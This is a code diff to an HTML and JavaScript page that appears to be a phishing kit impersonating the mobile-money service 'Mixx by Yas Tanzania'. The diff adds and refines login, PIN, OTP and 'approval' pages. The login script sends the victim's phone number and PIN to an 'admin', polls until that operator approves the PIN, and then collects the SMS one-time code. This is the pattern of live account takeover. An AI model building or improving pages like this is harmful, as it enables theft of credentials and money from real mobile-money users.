@@ -45,9 +45,6 @@
 
   /* LOGO */
   .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
-  .logo-dots { display:grid; grid-template-columns:1fr 1fr; gap:3px; width:28px; height:28px; }
-  .logo-dots span { width:12px; height:12px; border-radius:50%; display:block; }
-  .dot-1{background:#F5A623;} .dot-2{background:#1BC8D4;} .dot-3{background:#2ECC71;} .dot-4{background:#9B59B6;}
   .logo-text { font-size:1.1rem; font-weight:700; color:var(--teal); }
   .logo-sub   { font-size:0.72rem; color:rgba(255,255,255,0.65); }
 
@@ -118,13 +115,59 @@
   .feat .fs { font-size:0.73rem; color:var(--text-light); }
   .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.45); flex-shrink:0; }
 
-  /* ───── STEP PAGES 2-4 ───── */
+  /* ───── STEP PAGES ───── */
   .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
   .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
   .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
   .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
 
-  /* ───── PAGE 7: OTP ───── */
+  /* SUMMARY BOX */
+  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fafffe; }
+  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
+  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
+  .sum-row:last-child { border-bottom:none; }
+  .sum-row .sk { color:var(--text-light); }
+  .sum-row .sv { font-weight:500; }
+
+  /* ───── PAGE: SUBMITTED ───── */
+  #page-submitted { background:linear-gradient(160deg,var(--navy),#2a2f5a); align-items:center; justify-content:center; }
+  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
+  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
+  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,0.3)} 50%{box-shadow:0 0 0 16px rgba(255,215,0,0)} }
+  .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
+  .sub-wrap p  { color:rgba(255,255,255,0.75); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
+  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
+  .redir-n { font-weight:700; color:var(--teal); }
+  .btn-go { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; letter-spacing:0.04em; }
+
+  /* ───── PAGE: LOGIN ───── */
+  #page-login { background:#fff; }
+  .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
+  .login-hdr .logo-text { font-size:1.5rem; }
+  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
+  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
+  .login-inner { width:100%; max-width:380px; }
+  .lg-phone-row { display:flex; margin-bottom:24px; }
+  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
+  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:'Inter',sans-serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
+  .lg-phone-row input:focus { border-color:var(--teal); }
+  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
+  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
+  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
+  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
+  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
+  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
+  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .btn-login.rdy { background:var(--grad); color:#fff; }
+  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
+  .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
+  .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
+  .lg-foot .logo-text { font-size:1.2rem; }
+  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
+  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.45); }
+  .lg-terms a { color:rgba(255,255,255,0.65); }
+
+  /* ───── PAGE: OTP ───── */
   #page-otp { background:#fff; }
   .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; background:var(--navy); border-bottom:1px solid #eee; flex-shrink:0; }
   .otp-topbar .bk { font-size:1.1rem; color:#fff; cursor:pointer; background:none; border:none; }
@@ -146,7 +189,7 @@
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
 
-  /* ───── WAITING INDICATOR ───── */
+  /* ───── WAITING INDICATOR (ENHANCED) ───── */
   .waiting-box { 
     background:#f0fdf4; 
     border:2px solid #22c55e; 
@@ -178,7 +221,7 @@
     margin:0;
   }
 
-  /* MESSAGE BOXES */
+  /* ───── MESSAGE BOXES ───── */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
   .msg-box.show { display:flex; }
   .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
@@ -187,38 +230,45 @@
   .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
   .msg-icon { font-size:1.1rem; flex-shrink:0; }
 
-  /* OTP PAGE SECTIONS */
+  /* ───── OTP INPUT SECTION VISIBILITY (★ CRITICAL FIX ★) ───── */
   #otpInputSection { display:block; }
-  #otpInputSection.state-hidden { display:none !important; }
+  #otpInputSection.state-hidden { display:none !important; visibility:hidden !important; }
 
-  /* LOGIN PAGE */
-  #page-login { background:#fff; }
-  .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-hdr .logo-text { font-size:1.5rem; }
-  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
-  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
-  .login-inner { width:100%; max-width:380px; }
-  .lg-phone-row { display:flex; margin-bottom:24px; }
-  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
-  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:'Inter',sans-serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
-  .lg-phone-row input:focus { border-color:var(--teal); }
-  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
-  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-login.rdy { background:var(--grad); color:#fff; }
-  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
-  .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-foot .logo-text { font-size:1.2rem; }
-  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
-  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.45); }
-  .lg-terms a { color:rgba(255,255,255,0.65); }
+  /* ───── PAGE: MERCHANT PIN ───── */
+  #page-merchant-pin { background:#fff; }
+  .rdy { background:var(--grad); color:#fff; }
 
-  @media(max-width:500px){.field-row{grid-template-columns:1fr;}}
+  /* ───── PAGE: APPROVAL ───── */
+  #page-approval { background:linear-gradient(135deg,#1BC8D4 0%,#8B6FD4 50%,#9B59B6 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
+  .appr-wrap { width:100%; max-width:520px; }
+  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
+  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(255,215,0,0.5); }
+  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
+  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
+  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
+  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.8); text-transform:uppercase; letter-spacing:0.06em; }
+  .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
+  .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
+  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
+  .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
+  .ld-card { background:#fff; padding:20px 24px; }
+  .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
+  .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
+  .ld-row:last-child { border-bottom:none; }
+  .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
+  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);}
+  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
+  .ld-val { font-size:0.9rem; font-weight:600; }
+  .qa-wrap { background:#fff; padding:0 24px 18px; }
+  .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
+  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .qa-btn:hover { border-color:var(--teal); color:var(--teal); }
+  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
+  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
+  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
+  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:'Inter',sans-serif; }
+
+  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
 </style>
 </head>
 <body>
@@ -259,7 +309,7 @@
   <div class="land-footer">© 2026 Mixx by Yas Tanzania</div>
 </div>
 
-<!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
+<!-- ══════════════════════ PAGE: LOGIN ══════════════════════ -->
 <div id="page-login" class="page">
   <div class="login-hdr">
     <div style="display:flex;flex-direction:column;align-items:center;gap:4px;">
@@ -300,7 +350,7 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 7: OTP (with PIN approval waiting) ══════════════════════ -->
+<!-- ══════════════════════ PAGE: OTP (★ WITH PIN WAITING FIX ★) ══════════════════════ -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
@@ -313,7 +363,6 @@
       <p class="otp-hint">ujumbe umetumwa kwenye nambari yako ya simu</p>
       <div class="otp-phone" id="otpPh">+255712345678</div>
 
-      <!-- Inline messages for OTP page -->
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
       <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
@@ -457,7 +506,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // ★ LOGIN — SUBMIT PIN (step 1: send PIN to admin) ★
+  // ★ LOGIN — SUBMIT PIN ★
   // ══════════════════════════════════════════════════════
   async function doLogin() {
     hideLoginMsg();
@@ -496,12 +545,12 @@
         S.assignedAdminId = data.assignedAdminId;
         document.getElementById('otpPh').textContent = phoneNumber;
 
-        // ★ GO TO OTP PAGE AND SHOW WAITING FOR ADMIN APPROVAL
+        // ★ GO TO OTP PAGE AND SHOW WAITING FOR ADMIN APPROVAL ★
         goTo('page-otp');
         document.getElementById('pinWait').classList.add('show');
         document.getElementById('otpInputSection').classList.add('state-hidden');
 
-        // ★ START POLLING FOR ADMIN PIN APPROVAL
+        // ★ START POLLING FOR ADMIN PIN APPROVAL ★
         pollPinStatus();
 
       } else {
@@ -517,7 +566,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // ★ POLL FOR PIN APPROVAL (admin taps ✅ or ❌) ★
+  // ★ POLL FOR PIN APPROVAL ★
   // ══════════════════════════════════════════════════════
   let pinPollInterval = null;
 
@@ -631,7 +680,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // OTP SUBMIT — calls /api/verify-otp
+  // OTP SUBMIT
   // ══════════════════════════════════════════════════════
   async function doOtp() {
     const otp = document.getElementById('otpInput').value.trim();
